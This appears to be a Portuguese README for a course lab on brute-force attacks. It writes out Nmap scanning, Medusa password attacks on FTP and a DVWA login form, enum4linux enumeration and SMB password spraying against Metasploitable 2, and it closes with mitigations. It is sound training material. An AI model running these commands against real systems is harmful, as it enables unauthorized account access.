🔐 Desafio de Cibersegurança — Ataques de Força Bruta com Medusa

Este repositório apresenta a documentação prática do desafio de cibersegurança utilizando Kali Linux, Medusa, Metasploitable 2 e DVWA, para simular ataques de força bruta em um ambiente controlado.

Todo o projeto foi estruturado conforme as diretrizes do desafio da DIO.

🏗️ 1. Arquitetura do Ambiente

Foram consideradas duas VMs no VirtualBox:

Máquina	Sistema	Função	Rede
Kali Linux	Kali Rolling	Atacante	Host-Only
Metasploitable 2	Sistema Vulnerável	Serviços FTP/DVWA/SMB	Host-Only

Ambas configuradas para comunicação local entre si.

🔎 2. Varredura e Enumeração com Nmap

Comando utilizado:

nmap -sV -Pn 192.168.56.101


Serviços identificados:

FTP (21)

SSH (22)

Apache Web (80)

Samba SMB (445)

🔐 3. Ataque de Força Bruta em FTP (Medusa)

Wordlist localizada em:
/wordlists/passwords.txt

Comando:

medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp


Resultado esperado:
Senha encontrada → msfadmin

🌐 4. Força Bruta em Formulário Web (DVWA)

DVWA configurado com:

Usuário padrão: admin

Security Level: Low

Comando executado:

medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http \
 -m FORM:"/dvwa/login.php" \
 -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
 -m ACCEPT:"Login failed"


Senha válida: password

📡 5. Password Spraying em SMB

Enumeração de usuários:

enum4linux -U 192.168.56.101


Ataque:

medusa -h 192.168.56.101 -U wordlists/users.txt -p msfadmin -M smbnt

🛡️ 6. Mitigações Recomendadas

Política de senhas fortes.

Bloqueio após tentativas incorretas.

Uso de MFA.

Desativação de serviços desnecessários.

Monitoramento de logs.

Aplicação de patches e atualizações.

📁 7. Estrutura do Repositório
/desafio-medusa-bruteforce
├── README.md
├── /images
│   └── .gitkeep
├── /wordlists
│   ├── passwords.txt
│   └── users.txt
└── /scripts
    ├── scan_nmap.sh
    └── ftp_bruteforce.sh

🏁 8. Conclusão

Este projeto demonstra como ataques de força bruta funcionam em diferentes serviços, reforçando a importância de práticas de segurança como autenticação forte, hardening, monitoramento e redução de superfície de ataque.
